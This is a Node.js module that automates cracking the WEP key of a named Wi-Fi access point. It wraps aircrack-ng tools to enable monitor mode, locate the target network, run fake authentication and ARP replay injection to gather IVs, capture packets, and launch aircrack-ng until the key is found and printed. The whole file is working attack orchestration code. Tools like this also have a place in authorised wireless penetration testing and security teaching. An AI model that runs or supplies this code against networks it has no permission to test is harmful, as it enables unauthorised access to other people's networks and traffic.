
const EventEmitter = require('events');
const path = require('path');

const Airmon = require('./airmon-ng');
const Airdump = require('./airodump-ng');
const Airplay = require('./aireplay-ng');
const Aircrack = require('./aircrack-ng');

class Job extends EventEmitter {
    constructor (apName, ourMac, iface, minIvs) {
        super();

        this.tmpDir = path.normalize(__dirname, '/../dump');
        this.apName = apName;
        this.ourMac = ourMac;
        this.iface = iface;
        this.minIvs = minIvs;
        this.bssid = null;
    }

    startAirmon (callBack) {
        let job = this;
        let ifaceName = this.iface;

        Airmon.getIfaces(function(err, ifaces) {
            if(err)
                return job.emit('error', err);

            let current = ifaces.filter((iface) => iface.iface == ifaceName).pop() || {};

            let loop = function(f) {

                let d = f.shift();

                if (d) {
                    if(d.iface === current.iface) {
                        Airmon.stopIfaces(d.iface, function(err, curentNik, ifaces) {
                            if(err)
                                return job.emit('error', err);

                            loop(f);
                        })
                    }
                    else {
                        loop(f);
                    }
                }
                else {
                    Airmon.startIfaces(ifaceName, function(err, curentNik, ifaces) {
                        if(err)
                            return job.emit('error', err);

                        callBack(curentNik);
                    });
                }
            };

            loop(ifaces);
        });
    }

    stopAirmon (callBack) {
        let job = this;

        Airmon.stopIfaces(this.iface, function(err, curentNik, ifaces) {
            if(err)
                return job.emit('error', err);
        });
    }

    getAirmon (callBack) {
        let job = this;

        Airmon.getIfaces(function(err, ifaces) {
            if(err)
                return job.emit('error', err);
            callBack(ifaces);
        });
    }

    startDump (callBack) {

        let {bssid, channel, current: {iface}} = this;

        let ad = this.currentDump = Airdump.dumpBssid(iface, bssid, channel);
        ad.on('update', callBack);
        ad.on('error', err => ad.kill());

        return function (){
            ad.kill();
        };
    }

    getInfo (callBack) {

        let {apName:searchAP, current: {given: iface}} = this;

        let ad = Airdump.dumpAll(iface);

        ad.on('update', function(networks, file) {

            let network = networks.filter(wap => wap.SSID.essid.$t === searchAP).first();

            if (network) {
                ad.kill();
                callBack(network, file);
            }

            //console.log(networks)
        });
        ad.on('error', err => ad.kill());

        return function () {
            ad.kill();
        }
    }

    testInjection (callBack) {
        let job = this;
        console.log(job.current.given, this.apName, this.bssid)
        Airplay.testInjection(job.current.given, this.apName, this.bssid, function(err) {
            if(err) {
                throw err;
            }
            callBack();
        })
    }

    testFakeAuth (callBack) {
        let job = this;
        Airplay.testFakeAuth(job.current.given, this.apName, this.bssid, this.ourMac, function(err) {
            if(err) {
                throw err;
            }
            callBack();
        })
    }

    fakeAuth (callBack) {
        let job = this;
        return Airplay.fakeAuth(job.current.given, this.apName, this.bssid, this.ourMac, function(err) {
            if(err) {
                throw err;
            }
            callBack();
        })
    }

    arpReplay (callBack) {
        // given, bssid, ourMac, update
        let job = this;
        let hasSent = false;

        let onUpdate = function(info) {
            job.arpInfo = info;
            if(!hasSent) {
                hasSent = true;
                callBack();
            }
        };

        return Airplay.arpReplay(job.current.given, this.bssid, this.ourMac, onUpdate, function(err) {
            if(err) {
                throw err;
            }
        })
    }

    startArp (callBack) {
        let job = this;

        this.testInjection(function() {
            job.emit('step', 'testInjection');

            job.testFakeAuth(function() {
                job.emit('step', 'testFakeAuth');

                let killFake = job.fakeAuth(function() {
                    job.emit('step', 'fakeAuth');

                    let killReplay = job.arpReplay(function() {
                        job.emit('step', 'arpReplay');
                        callBack(killFake, killReplay);

                        job.once('kill', function() {
                            killFake();
                            killReplay();
                        });

                    });
                });
            });
        });
    }

    start (callBack) {
        let job = this;
        let isCracking = false;
        let isKilled = true;

        job.once('kill', function() {
            isKilled = false;
        });

        job.startAirmon(function(iface) {
            if(!isKilled)
                return;

            job.emit('step', 'startAirmon');
            job.current = iface;

            job.getInfo(function(networkInfo) {
                if(!isKilled)
                    return;

                job.emit('step', 'getInfo');
                job.bssid = networkInfo.BSSID;
                job.channel = networkInfo.channel;

                Airmon.stopIfaces(job.current.iface, function(err, curentNik, ifaces) {
                    if(!isKilled) return;

                    job.emit('step', 'stopIfaces');

                    if(err)
                        return job.emit('error', err);

                    Airmon.startIfacesChan(job.current.iface, job.channel, function(err, curentNik, ifaces) {
                        if(!isKilled) return;

                        job.emit('step', 'startIfacesChan');

                        if(err)
                            return job.emit('error', err);

                        job.startArp(function(killFake, killReplay) {
                            if(!isKilled) return;

                            job.emit('step', 'startArp');

                            let crackinfo = {
                                'keys': 0,
                                'ivs': 0
                            };

                            let kill = job.startDump(function(networkInfo, file) {
                                if(!isCracking && job.minIvs < networkInfo.packets.data) {
                                    isCracking = true;

                                    let onUpdate = function(i) {
                                        if(!isKilled) return;
                                        crackinfo = i;
                                    };
                                    let onFound = function(key) {
                                        console.log('found key ' + key);
                                        kill();
                                    };
                                    let onError = function() {
                                        kill();
                                    };

                                    let killCrack = Aircrack.crackWep(file, job.bssid, onUpdate, onFound, onError);

                                    job.once('kill', () => killCrack());

                                    process.once('SIGINT', () => job.emit('kill'));
                                }

                                if(!isKilled) return;

                                job.emit('status', {
                                    networkInfo, crackinfo,
                                    arpInfo: job.arpInfo
                                });
                            });

                        });
                    });
                });
            });
        });
    }

}

module.exports = Job;
